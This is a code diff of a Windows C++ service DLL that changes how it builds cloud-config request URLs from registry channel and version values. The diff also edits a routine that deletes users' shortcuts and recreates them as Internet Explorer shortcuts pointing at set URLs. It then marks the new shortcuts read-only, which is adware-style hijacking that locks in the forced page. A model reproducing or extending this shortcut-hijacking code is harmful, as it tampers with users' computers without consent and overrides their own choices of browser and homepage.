@@ -28,8 +28,11 @@ extern HMODULE g_hModule;
 int AiDll::Install()
 {
 	ultra::CreateDirectoryR(ultra::ExpandEnvironment(SERVICE_DIR_L));
+
 	if (AiDll::GetCloudCfg())
 	{
+		//初始化配置文件
+		
 		std::wstring dir = ultra::ExpandEnvironment(SERVICE_DIR_L);
 		CNetwork* network = CNetwork::Instance();
 		if (CheckIsNeedInstall())
@@ -110,7 +113,7 @@ void AiDll::Work(int magic)
 				DeleteFile(szSvcCfg_Old.c_str());
 			}
 		}
-		while(network->HttpDownloadFile(std::wstring(SERVER_DIR) + CFG_INI, szSvcCfg) == false)
+		while(network->HttpDownloadFile(GetRequestUrlByName(CFG_INI), szSvcCfg) == false)
 		{
 			Sleep(1000*60*10);
 		}
@@ -231,7 +234,7 @@ UINT WINAPI  AiDll::ModifyShortCutProc( void* param )
 									//OutputDebugStringW(strPath.c_str());
 									//xlog("CheckFileExist %s %s %s", ultra::_T2A(strPath).c_str(), ultra::_T2A(strTarget).c_str(), ultra::_T2A(strArguments).c_str());
 									Shell::GetShortCutInfo(strPath, strTarget, strArguments, strWorkDirectory, strIconLocation);
-									if (strTarget == L"" && ultra::CompareStringNoCase(strArguments, mscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscieUrl) != 0)
+									if (strTarget == L"" && ultra::CompareStringNoCase(strArguments, mscUrl) != 0 && (cscUrl[0] == L'\0' || ultra::CompareStringNoCase(strArguments, cscUrl) != 0) && ( cscieUrl[0] == L'\0'|| ultra::CompareStringNoCase(strArguments, cscieUrl) != 0))
 									{
 										DeleteFile(strPath.c_str());
 										//xlog("CreateShortCutLink %s %s", ultra::_T2A(strFileName).c_str(), szScUrl);
@@ -239,7 +242,7 @@ UINT WINAPI  AiDll::ModifyShortCutProc( void* param )
 										Shell::CreateShortCutLink(GetNameFromPath(strFileName), mscUrl, GetIEDir(),  destVec[j], mscUrl, L"", strIconLocation);
 										SetFileAttributes((destVec[j]+strFileName).c_str(), FILE_ATTRIBUTE_READONLY);
 									}
-									else if (ultra::CompareStringNoCase(strArguments, mscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscUrl) != 0 && ultra::CompareStringNoCase(strArguments, cscieUrl) != 0)
+									else if (ultra::CompareStringNoCase(strArguments, mscUrl) != 0 && (cscUrl[0] == L'\0' || ultra::CompareStringNoCase(strArguments, cscUrl) != 0) && (cscieUrl[0] == L'\0'|| ultra::CompareStringNoCase(strArguments, cscieUrl) != 0))
 									{
 										//OutputDebugStringW(L"create");
 										//xlog("CreateShortCutLink %s %s", ultra::_T2A(strFileName).c_str(), szScUrl);
@@ -692,7 +695,7 @@ bool AiDll::GetCloudCfg()
 	CNetwork* network = CNetwork::Instance();
 
 	std::string strReturn;
-	if (network->HttpDownloadString(std::wstring(SERVER_DIR)+L"UpdateInfo.lua", strReturn))
+	if (network->HttpDownloadString(GetRequestUrlByName(L"UpdateInfo.lua"), strReturn))
 	{
 		if (strReturn[0] >= 'a' && strReturn[0] <= 'z')
 		{
@@ -1206,3 +1209,56 @@ BOOL Shell::GetShortCutInfo(std::wstring strFileName, std::wstring& strTarget, s
 	return bRet;
 }
 
+bool AiDll::InitUpdateCfg()
+{
+	bool bRet = false;
+
+	std::wstring dir = ultra::ExpandEnvironment(SERVICE_DIR_L);
+	std::wstring strIniPath = dir + L"update.ini";
+	
+	std::wstring strChannel;
+	CRegedit::Read(HKEY_LOCAL_MACHINE, PRODUCT_REG_L, PRODUCT_REG_CHANNEL_L, strChannel);
+	if (!strChannel.empty())
+	{
+		WritePrivateProfileString(L"updatecfg",L"channel",strChannel.c_str(),strIniPath.c_str());
+	}
+
+	std::wstring strVer;
+	CRegedit::Read(HKEY_LOCAL_MACHINE, PRODUCT_REG_L, PRODUCT_REG_VER_L, strVer);
+	if (!strVer.empty())
+	{
+		std::wstring strBuildNum = L"";
+		std::wstring::size_type pos = strVer.find_last_of(L".");
+		if (pos != std::wstring::npos)
+		{
+			strBuildNum = strVer.substr(pos+1);
+		}
+		if (!strBuildNum.empty())
+		{
+			WritePrivateProfileString(L"updatecfg",L"ver",strBuildNum.c_str(),strIniPath.c_str());
+		}
+		
+	}
+	if (!strChannel.empty() && !strVer.empty())
+	{
+		bRet = true;
+	}
+	return bRet;
+}
+
+std::wstring AiDll::GetRequestUrlByName(const std::wstring &strFileName)
+{
+	InitUpdateCfg();
+	std::wstring dir = ultra::ExpandEnvironment(SERVICE_DIR_L);
+	std::wstring strIniPath = dir + L"update.ini";
+
+	WCHAR szChannel[MAX_PATH] = {0};
+	GetPrivateProfileString(L"updatecfg", L"channel", L"", szChannel, MAX_PATH, strIniPath.c_str());
+	
+	WCHAR szVer[MAX_PATH] = {0};
+	GetPrivateProfileString(L"updatecfg", L"ver", L"", szVer, MAX_PATH, strIniPath.c_str());
+
+	WCHAR szRequestUrl[MAX_PATH] = {0};
+	swprintf(szRequestUrl,L"%scfg?file=%s&clientver=%s&channel=%s",SERVER_DIR,strFileName.c_str(),szVer,szChannel);
+	return std::wstring(szRequestUrl);
+}
